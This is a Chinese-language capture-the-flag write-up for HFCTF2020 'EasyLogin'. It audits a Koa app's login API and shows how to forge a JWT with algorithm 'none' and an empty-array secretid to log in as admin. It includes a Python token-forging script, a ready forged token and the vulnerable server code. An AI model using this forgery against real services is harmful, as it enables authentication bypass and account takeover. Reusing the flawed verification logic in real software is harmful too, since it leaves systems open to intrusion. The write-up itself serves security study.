# \[HFCTF2020]EasyLogin

## \[HFCTF2020]EasyLogin

## 考点

* koa框架代码审计
* JWT特性

## wp

F12在`/static/app.js`中看到提示koa框架，百度一下找到[koa的框架结构](https://www.cnblogs.com/wangjiahui/p/12660093.html)

尝试直接访问app.js可以得到koa项目入口

![](<../.gitbook/assets/image (20) (1) (1).png>)

在`/static/app.js`中可以看到访问的都是api，所以这里的处理逻辑应该都是api，尝试出来代码位置是`/controllers/api.js`，代码放最后。可以看到它有一个获取token的过程

```javascript
const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization
```

在登录处抓包，可以发现登录时都会加上一个`authorization`参数

![](<../.gitbook/assets/image (15) (1).png>)

去[`https://jwt.io/`](https://jwt.io)可以看到解码后的内容

![](<../.gitbook/assets/image (18) (1) (1) (1).png>)

把`alg`改成`none`，JWT中当`alg`为`none`，`secret`为空时，后端将不执行签名验证。

用户名密码改成`admin`，至于`secretid`，它的处理在如下代码，先从jwt里面获取`secretid`，如果`secretid`未定义、或者是空、或者小于0、或者大于等于18(`global.secrets.length`)，就会抛出错误，下一步是到全局列表变量`global.secrets`中获取`secretid`对应的下标，再去jwt验证。

参数比较多，理一下，`secret`是一个长度18的字符串，`secretid`是一个0-18的数字，`secrets`是一个列表。

```javascript
const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
  throw new APIError('login error', 'no such secret id');
 }
const secret = global.secrets[sid];
const user = jwt.verify(token, secret, {algorithm: 'HS256'});
```

如果把`secretid`改成`[]`，让`secretid`为空列表，`secret`也会变成空，这样就绕过了jwt的验证

```python
import jwt
token = jwt.encode(
{
  "secretid": [],
  "username": "admin",
  "password": "admin",
  "iat": 1640163432
},
algorithm="none",key="")

print(token)
```

payload

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNjQwMTYzNDMyfQ.
```

![](<../.gitbook/assets/image (16) (1) (1).png>)

controllers/api.js

```javascript
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length > 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});

        const status = username === user.username && password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```

## 小结

1. JWT组成
2. JWT中当`alg`为`none`，`secret`为空时，相当于不执行签名验证。
